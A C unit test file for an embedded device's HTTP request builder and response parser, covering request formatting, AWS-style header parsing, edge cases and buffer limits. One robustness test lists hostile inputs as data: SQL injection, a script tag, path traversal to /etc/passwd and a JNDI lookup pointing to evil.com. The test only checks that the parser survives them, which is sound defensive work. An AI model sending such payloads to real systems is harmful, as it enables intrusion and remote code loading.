#include "unity.h"
#include "network/http.h"
#include <string.h>
#include <stdlib.h>

// ════════════════════════════════════════════════════════════════
// get_request
// ════════════════════════════════════════════════════════════════

TEST_CASE("get_default_path_is_root", "[http]") {
    char buf[256];
    http_get_request(buf, sizeof(buf), "host.example.com", NULL);
    TEST_ASSERT_NOT_NULL(strstr(buf, "GET / HTTP/1.0\r\n"));
}

TEST_CASE("get_explicit_root_path", "[http]") {
    char buf[256];
    http_get_request(buf, sizeof(buf), "host.example.com", "/");
    TEST_ASSERT_NOT_NULL(strstr(buf, "GET / HTTP/1.0\r\n"));
}

TEST_CASE("get_custom_path", "[http]") {
    char buf[256];
    http_get_request(buf, sizeof(buf), "h", "/hello");
    TEST_ASSERT_NOT_NULL(strstr(buf, "GET /hello HTTP/1.0\r\n"));
}

TEST_CASE("get_host_header_present", "[http]") {
    char buf[256];
    http_get_request(buf, sizeof(buf), "supervictor.advin.io", "/");
    TEST_ASSERT_NOT_NULL(strstr(buf, "Host: supervictor.advin.io\r\n"));
}

TEST_CASE("get_user_agent_present", "[http]") {
    char buf[256];
    http_get_request(buf, sizeof(buf), "h", NULL);
    TEST_ASSERT_NOT_NULL(strstr(buf, "User-Agent: Uplink/0.1.0 (Platform; ESP32-C3)\r\n"));
}

TEST_CASE("get_accept_header_present", "[http]") {
    char buf[256];
    http_get_request(buf, sizeof(buf), "h", NULL);
    TEST_ASSERT_NOT_NULL(strstr(buf, "Accept: */*\r\n"));
}

TEST_CASE("get_terminates_with_double_crlf", "[http]") {
    char buf[256];
    int n = http_get_request(buf, sizeof(buf), "h", NULL);
    TEST_ASSERT_GREATER_THAN(3, n);
    TEST_ASSERT_EQUAL_STRING("\r\n", buf + n - 2);
    TEST_ASSERT_NOT_NULL(strstr(buf, "\r\n\r\n"));
}

TEST_CASE("get_uses_http_1_0", "[http]") {
    char buf[256];
    http_get_request(buf, sizeof(buf), "h", "/");
    TEST_ASSERT_NOT_NULL(strstr(buf, "HTTP/1.0"));
    TEST_ASSERT_NULL(strstr(buf, "HTTP/1.1"));
}

TEST_CASE("get_overflow_returns_negative", "[http]") {
    char buf[8]; // Too small
    int n = http_get_request(buf, sizeof(buf), "h", "/");
    TEST_ASSERT_LESS_THAN(0, n);
}

// ════════════════════════════════════════════════════════════════
// post_request
// ════════════════════════════════════════════════════════════════

TEST_CASE("post_default_path_is_root", "[http]") {
    char buf[512];
    http_post_request(buf, sizeof(buf), "h", "{}", NULL);
    TEST_ASSERT_NOT_NULL(strstr(buf, "POST / HTTP/1.1\r\n"));
}

TEST_CASE("post_custom_path", "[http]") {
    char buf[512];
    http_post_request(buf, sizeof(buf), "h", "{}", "/hello");
    TEST_ASSERT_NOT_NULL(strstr(buf, "POST /hello HTTP/1.1\r\n"));
}

TEST_CASE("post_uses_http_1_1", "[http]") {
    char buf[512];
    http_post_request(buf, sizeof(buf), "h", "{}", "/");
    TEST_ASSERT_NOT_NULL(strstr(buf, "HTTP/1.1"));
    TEST_ASSERT_NULL(strstr(buf, "HTTP/1.0"));
}

TEST_CASE("post_host_header", "[http]") {
    char buf[512];
    http_post_request(buf, sizeof(buf), "supervictor.advin.io", "{}", "/");
    TEST_ASSERT_NOT_NULL(strstr(buf, "Host: supervictor.advin.io\r\n"));
}

TEST_CASE("post_content_type_json", "[http]") {
    char buf[512];
    http_post_request(buf, sizeof(buf), "h", "{}", "/");
    TEST_ASSERT_NOT_NULL(strstr(buf, "Content-Type: application/json\r\n"));
}

TEST_CASE("post_connection_close", "[http]") {
    char buf[512];
    http_post_request(buf, sizeof(buf), "h", "{}", "/");
    TEST_ASSERT_NOT_NULL(strstr(buf, "Connection: close\r\n"));
}

TEST_CASE("post_contains_json_body", "[http]") {
    char buf[512];
    http_post_request(buf, sizeof(buf), "h", "{\"id\":\"test-id\",\"current\":99}", "/");
    TEST_ASSERT_NOT_NULL(strstr(buf, "{\"id\":\"test-id\",\"current\":99}"));
}

TEST_CASE("post_body_after_double_crlf", "[http]") {
    char buf[512];
    http_post_request(buf, sizeof(buf), "h", "{\"x\":1}", "/");
    char *sep = strstr(buf, "\r\n\r\n");
    TEST_ASSERT_NOT_NULL(sep);
    char *body = sep + 4;
    TEST_ASSERT_EQUAL('{', body[0]);
}

TEST_CASE("post_content_length_matches_body", "[http]") {
    const char *json = "{\"id\":\"test-id\",\"current\":12345}";
    char buf[512];
    http_post_request(buf, sizeof(buf), "h", json, "/");

    // Extract Content-Length
    char *cl = strstr(buf, "Content-Length: ");
    TEST_ASSERT_NOT_NULL(cl);
    int claimed = atoi(cl + 16);

    // Extract actual body
    char *body = strstr(buf, "\r\n\r\n") + 4;
    TEST_ASSERT_EQUAL(claimed, (int)strlen(body));
}

// ════════════════════════════════════════════════════════════════
// parse_response — happy paths
// ════════════════════════════════════════════════════════════════

static const char *FULL_AWS_RESPONSE =
    "HTTP/1.1 200 OK\r\n"
    "x-amzn-RequestId: a1b2c3d4-e5f6-7890-abcd-ef1234567890\r\n"
    "x-amz-apigw-id: AbCdEfGhIjKlMnOpQrStUv\r\n"
    "X-Amzn-Trace-Id: Root=1-12345678-abcdef012345678901234567\r\n"
    "Content-Type: application/json\r\n"
    "Content-Length: 42\r\n"
    "Date: Thu, 27 Feb 2025 12:00:00 GMT\r\n"
    "\r\n"
    "{\"message\":\"Hello from Supervictor!\"}";

TEST_CASE("parse_full_aws_response", "[http]") {
    lambda_response_t resp;
    TEST_ASSERT_EQUAL(SV_OK, http_parse_response(FULL_AWS_RESPONSE, &resp));
    TEST_ASSERT_EQUAL_STRING("a1b2c3d4-e5f6-7890-abcd-ef1234567890", resp.x_amzn_request_id);
    TEST_ASSERT_EQUAL_STRING("AbCdEfGhIjKlMnOpQrStUv", resp.x_amz_apigw_id);
    TEST_ASSERT_EQUAL_STRING("Root=1-12345678-abcdef012345678901234567", resp.x_amzn_trace_id);
    TEST_ASSERT_EQUAL_STRING("application/json", resp.content_type);
    TEST_ASSERT_EQUAL_STRING("42", resp.content_length);
    TEST_ASSERT_EQUAL_STRING("Thu, 27 Feb 2025 12:00:00 GMT", resp.date);
    TEST_ASSERT_NOT_NULL(strstr(resp.body, "Hello from Supervictor!"));
}

TEST_CASE("parse_headers_no_body", "[http]") {
    lambda_response_t resp;
    TEST_ASSERT_EQUAL(SV_OK,
        http_parse_response("HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\n", &resp));
    TEST_ASSERT_EQUAL_STRING("text/plain", resp.content_type);
    TEST_ASSERT_EQUAL_STRING("", resp.body);
}

TEST_CASE("parse_minimal_response", "[http]") {
    lambda_response_t resp;
    TEST_ASSERT_EQUAL(SV_OK,
        http_parse_response("HTTP/1.1 200 OK\r\n\r\nbody", &resp));
    TEST_ASSERT_EQUAL_STRING("body", resp.body);
}

TEST_CASE("parse_json_body", "[http]") {
    lambda_response_t resp;
    TEST_ASSERT_EQUAL(SV_OK,
        http_parse_response("HTTP/1.1 200 OK\r\n\r\n{\"key\":\"value\"}", &resp));
    TEST_ASSERT_EQUAL_STRING("{\"key\":\"value\"}", resp.body);
}

// ════════════════════════════════════════════════════════════════
// parse_response — case insensitivity
// ════════════════════════════════════════════════════════════════

TEST_CASE("parse_case_insensitive_content_type", "[http]") {
    lambda_response_t resp;
    TEST_ASSERT_EQUAL(SV_OK,
        http_parse_response("HTTP/1.1 200 OK\r\nCONTENT-TYPE: text/html\r\n\r\n", &resp));
    TEST_ASSERT_EQUAL_STRING("text/html", resp.content_type);
}

TEST_CASE("parse_case_insensitive_request_id", "[http]") {
    lambda_response_t resp;
    TEST_ASSERT_EQUAL(SV_OK,
        http_parse_response("HTTP/1.1 200 OK\r\nX-AMZN-REQUESTID: upper-case-id\r\n\r\n", &resp));
    TEST_ASSERT_EQUAL_STRING("upper-case-id", resp.x_amzn_request_id);
}

// ════════════════════════════════════════════════════════════════
// parse_response — header edge cases
// ════════════════════════════════════════════════════════════════

TEST_CASE("parse_colon_in_header_value", "[http]") {
    lambda_response_t resp;
    TEST_ASSERT_EQUAL(SV_OK,
        http_parse_response("HTTP/1.1 200 OK\r\nX-Amzn-Trace-Id: Root=1-abc:def:ghi\r\n\r\n", &resp));
    TEST_ASSERT_EQUAL_STRING("Root=1-abc:def:ghi", resp.x_amzn_trace_id);
}

TEST_CASE("parse_extra_whitespace_in_value", "[http]") {
    lambda_response_t resp;
    TEST_ASSERT_EQUAL(SV_OK,
        http_parse_response("HTTP/1.1 200 OK\r\nContent-Type:   text/plain   \r\n\r\n", &resp));
    TEST_ASSERT_EQUAL_STRING("text/plain", resp.content_type);
}

TEST_CASE("parse_unknown_headers_ignored", "[http]") {
    lambda_response_t resp;
    TEST_ASSERT_EQUAL(SV_OK, http_parse_response(
        "HTTP/1.1 200 OK\r\n"
        "X-Custom-Header: ignored\r\n"
        "Server: nginx\r\n"
        "Content-Type: application/json\r\n"
        "\r\n", &resp));
    TEST_ASSERT_EQUAL_STRING("application/json", resp.content_type);
}

TEST_CASE("parse_duplicate_header_last_wins", "[http]") {
    lambda_response_t resp;
    TEST_ASSERT_EQUAL(SV_OK, http_parse_response(
        "HTTP/1.1 200 OK\r\n"
        "Content-Type: first\r\n"
        "Content-Type: second\r\n"
        "\r\n", &resp));
    TEST_ASSERT_EQUAL_STRING("second", resp.content_type);
}

TEST_CASE("parse_malformed_header_no_colon_ignored", "[http]") {
    lambda_response_t resp;
    TEST_ASSERT_EQUAL(SV_OK, http_parse_response(
        "HTTP/1.1 200 OK\r\n"
        "NotAValidHeader\r\n"
        "Content-Type: text/plain\r\n"
        "\r\n", &resp));
    TEST_ASSERT_EQUAL_STRING("text/plain", resp.content_type);
}

// ════════════════════════════════════════════════════════════════
// parse_response — error cases
// ════════════════════════════════════════════════════════════════

TEST_CASE("parse_empty_string_fails", "[http]") {
    lambda_response_t resp;
    TEST_ASSERT_NOT_EQUAL(SV_OK, http_parse_response("", &resp));
}

TEST_CASE("parse_null_fails", "[http]") {
    lambda_response_t resp;
    TEST_ASSERT_NOT_EQUAL(SV_OK, http_parse_response(NULL, &resp));
}

// ════════════════════════════════════════════════════════════════
// parse_response — capacity overflow
// ════════════════════════════════════════════════════════════════

TEST_CASE("parse_body_at_1024_capacity", "[http]") {
    char raw[2048];
    int pos = snprintf(raw, sizeof(raw), "HTTP/1.1 200 OK\r\n\r\n");
    memset(raw + pos, 'X', 1024);
    raw[pos + 1024] = '\0';

    lambda_response_t resp;
    TEST_ASSERT_EQUAL(SV_OK, http_parse_response(raw, &resp));
    TEST_ASSERT_EQUAL(1024, strlen(resp.body));
}

TEST_CASE("parse_body_over_1024_fails", "[http]") {
    char raw[2048];
    int pos = snprintf(raw, sizeof(raw), "HTTP/1.1 200 OK\r\n\r\n");
    memset(raw + pos, 'X', 1025);
    raw[pos + 1025] = '\0';

    lambda_response_t resp;
    TEST_ASSERT_NOT_EQUAL(SV_OK, http_parse_response(raw, &resp));
}

TEST_CASE("parse_request_id_at_64", "[http]") {
    char raw[256];
    int pos = snprintf(raw, sizeof(raw), "HTTP/1.1 200 OK\r\nx-amzn-RequestId: ");
    memset(raw + pos, 'R', 64);
    pos += 64;
    snprintf(raw + pos, sizeof(raw) - pos, "\r\n\r\n");

    lambda_response_t resp;
    TEST_ASSERT_EQUAL(SV_OK, http_parse_response(raw, &resp));
    TEST_ASSERT_EQUAL(64, strlen(resp.x_amzn_request_id));
}

TEST_CASE("parse_request_id_over_64_fails", "[http]") {
    char raw[256];
    int pos = snprintf(raw, sizeof(raw), "HTTP/1.1 200 OK\r\nx-amzn-RequestId: ");
    memset(raw + pos, 'R', 65);
    pos += 65;
    snprintf(raw + pos, sizeof(raw) - pos, "\r\n\r\n");

    lambda_response_t resp;
    TEST_ASSERT_NOT_EQUAL(SV_OK, http_parse_response(raw, &resp));
}

// ════════════════════════════════════════════════════════════════
// Adversarial inputs
// ════════════════════════════════════════════════════════════════

TEST_CASE("parse_adversarial_strings_do_not_crash", "[http]") {
    const char *adversarial[] = {
        "HTTP/1.1 200 OK\r\n\r\n' OR 1=1 --",
        "HTTP/1.1 200 OK\r\n\r\n<script>alert(1)</script>",
        "HTTP/1.1 200 OK\r\n\r\n%00%0a%0d",
        "HTTP/1.1 200 OK\r\n\r\n../../../../etc/passwd",
        "HTTP/1.1 200 OK\r\n\r\n${jndi:ldap://evil.com/a}",
        "HTTP/1.1 200 OK\r\nContent-Type: \r\n\r\n",
        "HTTP/1.1 200 OK\r\n: empty-key\r\n\r\n",
        "\r\n\r\n",
        "\n",
        "HTTP",
        "HTTP/",
        "HTTP/1.1",
        "HTTP/1.1 ",
        "HTTP/1.1 200",
        "HTTP/1.1 200 OK",
    };
    lambda_response_t resp;
    for (int i = 0; i < (int)(sizeof(adversarial) / sizeof(adversarial[0])); i++) {
        // Must not crash
        http_parse_response(adversarial[i], &resp);
    }
}

// ════════════════════════════════════════════════════════════════
// Realistic AWS responses
// ════════════════════════════════════════════════════════════════

TEST_CASE("aws_200_post_response", "[http]") {
    const char *raw =
        "HTTP/1.1 200 OK\r\n"
        "Date: Thu, 27 Feb 2025 19:30:00 GMT\r\n"
        "Content-Type: application/json\r\n"
        "Content-Length: 49\r\n"
        "x-amzn-RequestId: a1b2c3d4-e5f6-7890-abcd-ef1234567890\r\n"
        "x-amz-apigw-id: AbCdEfGhIjKlMnOpQr\r\n"
        "X-Amzn-Trace-Id: Root=1-65e04f18-abcdef0123456789abcdef01\r\n"
        "\r\n"
        "{\"message\":\"Uplink received\",\"id\":\"device-001\"}";

    lambda_response_t resp;
    TEST_ASSERT_EQUAL(SV_OK, http_parse_response(raw, &resp));
    TEST_ASSERT_EQUAL_STRING("a1b2c3d4-e5f6-7890-abcd-ef1234567890", resp.x_amzn_request_id);
    TEST_ASSERT_EQUAL_STRING("AbCdEfGhIjKlMnOpQr", resp.x_amz_apigw_id);
    TEST_ASSERT_EQUAL_STRING("application/json", resp.content_type);
    TEST_ASSERT_NOT_NULL(strstr(resp.body, "Uplink received"));
}

TEST_CASE("aws_403_forbidden_mtls_rejection", "[http]") {
    const char *raw =
        "HTTP/1.1 403 Forbidden\r\n"
        "Content-Type: application/json\r\n"
        "x-amzn-RequestId: 00000000-0000-0000-0000-000000000000\r\n"
        "\r\n"
        "{\"message\":\"Forbidden\"}";

    lambda_response_t resp;
    TEST_ASSERT_EQUAL(SV_OK, http_parse_response(raw, &resp));
    TEST_ASSERT_NOT_NULL(strstr(resp.body, "Forbidden"));
    TEST_ASSERT_EQUAL_STRING("00000000-0000-0000-0000-000000000000", resp.x_amzn_request_id);
}
